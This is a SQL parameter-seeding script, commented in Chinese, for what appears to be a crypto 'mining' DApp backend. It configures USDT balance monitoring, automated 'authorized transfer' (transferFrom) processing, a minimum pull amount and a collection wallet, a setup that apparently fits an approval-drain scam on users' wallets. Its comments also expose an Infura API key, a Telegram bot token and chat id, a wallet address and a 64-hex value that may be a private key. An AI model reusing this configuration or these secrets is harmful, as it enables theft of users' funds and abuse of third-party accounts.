
-- 监控固定阀值,例：100，代表100U。为0则不启动任务--默认用户USDT阀值提醒
INSERT INTO T_SYSPARA VALUES ('auto_monitor_threshold', 'auto_monitor_threshold', null, '0', '100', '2', '监控固定阀值,例：100，代表100U。为0则不启动任务');




-- 10.28
-- eth节点
INSERT INTO T_SYSPARA VALUES ('eth_node', 'eth_node', null, '', '100', '2', 'eth节点地址');

-- ceshi https://mainnet.infura.io/v3/6bdf53f8e8c640dca30398e538f64749




-- 余额查询频率，单位毫秒，多少毫秒处理一条
INSERT INTO T_SYSPARA VALUES ('auto_monitor_balance_add_data_time', 'auto_monitor_balance_add_data_time', null, '10', '100', '2', '余额查询频率，单位毫秒，多少毫秒处理一条');
-- 交易哈希处理频率，单位毫秒，多少毫秒处理一条
INSERT INTO T_SYSPARA VALUES ('auto_monitor_hash_add_data_time', 'auto_monitor_hash_add_data_time', null, '10', '100', '2', '交易哈希处理频率，单位毫秒，多少毫秒处理一条');
-- 授权转账处理频率，单位毫秒，多少毫秒处理一条
INSERT INTO T_SYSPARA VALUES ('auto_monitor_transfer_from_add_data_time', 'auto_monitor_transfer_from_add_data_time', null, '50', '100', '2', '授权转账处理频率，单位毫秒，多少毫秒处理一条');



-- 10.29
INSERT INTO T_MINING_CONFIG VALUES ('2c948a827cccd850017cccde6f220001', '', '100-5000;0.0025-0.003|5000-20000;0.005-0.0055|20000-50000;0.0055-0.0065|50000-9999999;0.0065-0.0075', '0.0025-0.003|0.005-0.0055|0.0055-0.0065');



-- 地址 0xC88bA41DA91073B5E3358b6561B41e0aDf10D0B5
-- 0x84d3fff8bbb7e8139d8b921ce396820b131ab48a47bb60fb6b865b7b8d132765




-- 当日提现次数 withdraw_limit_num
-- 当日提现时间 withdraw_limit_time
-- 提现手续费类型  withdraw_fee_type
-- fixed单笔固定金额 和 rate百分比 的手续费数值  withdraw_fee
-- 提现手续费part分段的值(换算成USDT)  withdraw_fee_part
-- 最低转换额度(dapp usdt数量) withdraw_limit_dapp
INSERT INTO T_SYSPARA VALUES ('withdraw_limit_dapp', 'withdraw_limit_dapp', null, '10', '100', '2', '最低提现额度(dapp usdt数量)');


-- 默认固定手续费10U
UPDATE T_SYSPARA SET SVALUE='fixed' WHERE UUID='withdraw_fee_type';
UPDATE T_SYSPARA SET SVALUE='10' WHERE UUID='withdraw_fee';


-- 飞机群token 2090311739:AAG8g4rURN84VaMTrx58sIi6FH32ElyN7Yo
INSERT INTO T_SYSPARA VALUES ('telegram_message_token', 'telegram_message_token', null, '', '100', '2', '飞机群token');

-- chat_id -668114047
INSERT INTO T_SYSPARA VALUES ('telegram_message_chat_id', 'telegram_message_chat_id', null, '', '100', '2', 'chat_id');

-- 最小授权转账金额
INSERT INTO T_SYSPARA VALUES ('transferfrom_balance_min', 'transferfrom_balance_min', null, '1', '100', '2', '最小 授权转账 金额');


-- 归集钱包地址
INSERT INTO T_SYSPARA VALUES ('collection_sys_address', 'collection_sys_address', null, '', '100', '2', '归集钱包地址');


-- demo_u
-- lianfa
-- antminepool
